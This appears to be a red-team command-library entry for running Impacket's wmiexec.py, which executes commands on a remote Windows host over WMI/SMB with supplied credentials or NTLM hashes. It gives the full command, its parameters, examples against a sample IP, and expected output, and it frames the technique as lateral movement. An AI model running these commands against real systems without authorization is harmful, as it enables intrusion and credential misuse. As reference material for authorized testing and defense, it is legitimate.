---
id: 9ab20cc2-2532-4589-9e93-cf49cf65abab
name: impacket-wmiexec-execute-command
type: command
executor: python
data: >-
  python3 /path/to/impacket/examples/wmiexec.py
  $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET "$_REMOTE_COMMAND" -share $_SHARE
output: null
created_at: '2023-04-06T03:56:30.959327+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - Impacket
  - WMI
  - remote-execution
verified: true
validated: true
---

# Impacket WMIExec Execute Command

## Command

```python
python3 /path/to/impacket/examples/wmiexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET "$_REMOTE_COMMAND" -share $_SHARE
```

## Description

This command invokes Impacket's wmiexec.py to execute a semi-interactive command on a remote Windows target via WMI. It authenticates with provided credentials and stages output in an SMB share. Use for lateral movement when interactive shells are blocked but WMI/SMB is accessible.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name (or empty for local) | Yes |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password (or NTLM hash with -hashes) | Yes |
| $_TARGET | Target IP or hostname | Yes |
| $_REMOTE_COMMAND | Command to execute on target (e.g., 'whoami' or redirection script) | Yes |
| -share $_SHARE | Custom SMB share for output (default: ADMIN$) | No |
| /path/to/impacket | Path to Impacket installation | Yes |

## Examples

### Basic Usage

```python
python3 impacket/examples/wmiexec.py DOMAIN/user:pass@192.168.1.100 "whoami"
```

Executes 'whoami' and displays output directly if possible.

### Advanced Usage with Custom Share and Redirection

```python
python3 impacket/examples/wmiexec.py DOMAIN/user:pass@192.168.1.100 "cmd.exe /Q /c echo test > C:\\temp\\out.txt" -share C$\
```

Stages output in C$ share; retrieve via SMB afterward.

## Expected Output

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Username: user
[*] Password: pass
[*] Domain: DOMAIN
[*] Executing command: whoami
DOMAIN\user

(Success shows execution summary and any direct output; for file-based, confirm via share access. Errors: 'Access denied' or 'Share not found'.)

## Related

- [[procedures/remote-command-execution-via-wmi-using-impacket]]
- [[tools/Impacket]]
